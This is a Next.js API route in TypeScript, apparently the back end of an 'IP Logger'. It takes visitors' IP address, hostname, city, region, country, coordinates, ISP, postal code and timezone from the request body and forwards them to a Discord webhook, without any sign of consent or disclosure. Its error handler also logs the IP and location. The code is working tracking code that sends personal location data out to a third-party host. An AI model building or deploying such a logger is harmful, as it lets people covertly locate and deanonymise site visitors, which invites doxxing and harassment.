// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import { MessageEmbed } from 'discord.js'
import type { NextApiRequest, NextApiResponse } from 'next'

type Data = {
  ip?: string,
  hostname?: string,
  city?: string,
  region?: string,
  country?: string,
  loc?: string,
  org?: string,
  timezone?: string,
  message?: string,
  name?: string
}

const webhook: string = process.env.DISCORD_WEBHOOK

export default async function handler(
  req: NextApiRequest, 
  res: NextApiResponse<Data>
) {
  if (req.method !== 'POST') {
    return res.status(405).send({ message: 'Only POST requests allowed!' })
  }


  const ip: string = req.body.ip
  const hostname: string = req.body.hostname
  const city: string = req.body.city
  const region: string = req.body.region
  const country: string = req.body.country
  const loc: string = req.body.loc
  const org: string = req.body.org
  const postal: string = req.body.postal
  const timezone: string = req.body.timezone

  var params = 
  {
    embeds: [
    `**IP Logger: ** 
    \n**IP: ** ${ip}
    \n**Hostname: ** ${hostname}
    \n**City: ** ${city}
    \n**Region: ** ${region}
    \n**Country: ** ${country}
    \n**Loc: ** ${loc}
    \n**Org: ** ${org}
    \n**Postal: ** ${postal}
    \n**Timezone: ** ${timezone}`
    ]
  
  };

  await fetch(webhook, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content: params })
  })
    .catch(error => console.error('IP:', ip +  `Country:`, country + `Region:`, region + `City:`, city))
  return res.status(204).end()
};
